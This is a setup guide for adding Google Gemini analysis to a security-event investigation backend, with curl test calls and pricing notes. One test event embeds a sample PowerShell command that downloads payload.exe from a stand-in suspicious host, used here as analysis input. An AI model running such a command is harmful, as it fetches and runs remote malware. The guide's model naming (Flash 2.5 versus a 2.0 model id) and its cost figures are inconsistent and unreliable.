# 🚀 Quick Setup: Google Gemini Flash 2.5

## Why Gemini Flash 2.5?

✅ **Fastest** - Sub-second response times  
✅ **Most Cost-Effective** - 80% cheaper than GPT-4  
✅ **High Quality** - Comparable to GPT-4 for analysis tasks  
✅ **Large Context** - 1M token context window  

---

## Setup Steps

### 1. Get Your API Key

1. Go to [Google AI Studio](https://aistudio.google.com/app/apikey)
2. Click "Get API Key"
3. Create a new API key or use existing
4. Copy your API key

### 2. Add to .env File

Edit `/home/honours/SC/backend/.env`:

```env
# Enable AI Features
FEATURE_AI_ANALYSIS=true
FEATURE_AUTO_CLASSIFICATION=true

# Google Gemini Flash 2.5 Configuration
GOOGLE_AI_API_KEY=your-api-key-here
GOOGLE_AI_MODEL=gemini-2.0-flash-exp
```

### 3. Restart Backend

```bash
cd /home/honours/SC/backend
# Stop current server (Ctrl+C)
npm run dev
```

---

## Test the Integration

### Test Event Analysis

```bash
# Login first
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"investigator@company.com","password":"demo123"}' \
  | jq -r '.token')

# Analyze an event
curl -X POST http://localhost:5000/api/ml/analyze \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "event": {
      "type": "Process Execution",
      "timestamp": "2024-01-15T10:30:00Z",
      "details": {
        "process": "powershell.exe",
        "commandLine": "Invoke-WebRequest http://suspicious.com/payload.exe -OutFile C:\\temp\\malware.exe"
      }
    },
    "caseId": "CASE-001"
  }' | jq .
```

**Expected Response:**
```json
{
  "success": true,
  "analysis": {
    "result": "This event indicates a potential malware download attempt...",
    "model": "gemini-2.0-flash-exp",
    "provider": "Google Gemini Flash 2.5",
    "tokensUsed": 245
  }
}
```

### Test Classification

```bash
curl -X POST http://localhost:5000/api/ml/classify \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "event": {
      "type": "Network Connection",
      "source_ip": "192.168.1.100",
      "dest_ip": "185.220.101.45",
      "port": 443,
      "bytes": 50485760
    }
  }' | jq .
```

### Test Story Generation

```bash
curl -X POST http://localhost:5000/api/ml/generate-story \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "events": [
      {"type": "Phishing Email", "timestamp": "2024-01-15T09:00:00Z"},
      {"type": "Credential Access", "timestamp": "2024-01-15T09:15:00Z"},
      {"type": "Privilege Escalation", "timestamp": "2024-01-15T09:30:00Z"},
      {"type": "Data Exfiltration", "timestamp": "2024-01-15T10:00:00Z"}
    ],
    "caseId": "CASE-001"
  }' | jq .
```

---

## Check ML Health

```bash
curl http://localhost:5000/api/ml/health \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Response:**
```json
{
  "success": true,
  "status": "operational",
  "config": {
    "aiAnalysis": true,
    "autoClassification": true,
    "threatIntelligence": true,
    "providers": {
      "openai": false,
      "anthropic": false,
      "google": true
    }
  }
}
```

---

## Pricing (as of 2026)

| Model | Input | Output | Best For |
|-------|--------|--------|----------|
| **Gemini Flash 2.5** | $0.075 / 1M | $0.30 / 1M | Real-time analysis |
| GPT-4 | $10 / 1M | $30 / 1M | Complex reasoning |
| Claude 3 Sonnet | $3 / 1M | $15 / 1M | Long documents |

**Example Cost:**
- 1000 event analyses/day = ~$0.10/day with Gemini
- Same with GPT-4 = ~$15/day

---

## Features Enabled

✅ **Event Analysis** - Detailed security event explanations  
✅ **Auto-Classification** - MITRE ATT&CK mapping  
✅ **Story Generation** - Attack narrative creation  
✅ **Batch Processing** - Multiple events simultaneously  
✅ **Confidence Scoring** - ML-based risk assessment  

---

## Troubleshooting

### "No AI provider configured" error
- Check `.env` file has `GOOGLE_AI_API_KEY=your-key`
- Restart backend server
- Verify feature flag: `FEATURE_AI_ANALYSIS=true`

### "API key not valid"
- Generate new key at [Google AI Studio](https://aistudio.google.com/app/apikey)
- Make sure no extra spaces in `.env`
- Try key directly in API test

### Rate Limits
- Free tier: 15 requests/minute
- Paid tier: 1000 requests/minute
- Add retry logic if needed

---

## Frontend Integration

The frontend automatically uses the ML endpoints:

1. **Event Explanation Drawer** - Click any event → AI analysis
2. **Story View** - Auto-generated attack narratives
3. **Classification** - Automatic event categorization
4. **Confidence Scores** - ML-based risk levels

---

## Next Steps

1. ✅ Add your Gemini API key to `.env`
2. ✅ Enable feature flags
3. ✅ Restart backend
4. ✅ Test with curl commands
5. ✅ Login to frontend at http://localhost:3000
6. ✅ Click any event to see AI analysis!

---

**System Status:** 🟢 Ready for Gemini Flash 2.5

For more details, see [COMPLETE_GUIDE.md](./COMPLETE_GUIDE.md)
